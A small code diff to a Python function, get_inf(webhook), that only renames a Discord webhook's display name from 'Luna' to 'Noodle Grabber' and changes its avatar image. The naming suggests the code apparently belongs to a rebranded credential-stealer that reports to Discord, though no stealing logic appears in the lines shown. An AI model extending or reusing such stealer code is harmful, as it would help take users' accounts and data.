@@ -8,8 +8,8 @@ def get_inf(webhook):
     image_path = os.path.join(temp_directory, "image.png")
 
     webhook_data = {
-        "username": "Luna",
-        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+        "username": "Noodle Grabber",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1120798395389444169/1122895649201983519/image-250x250.jpg",
         "embeds": [
             {
                 "color": 5639644,
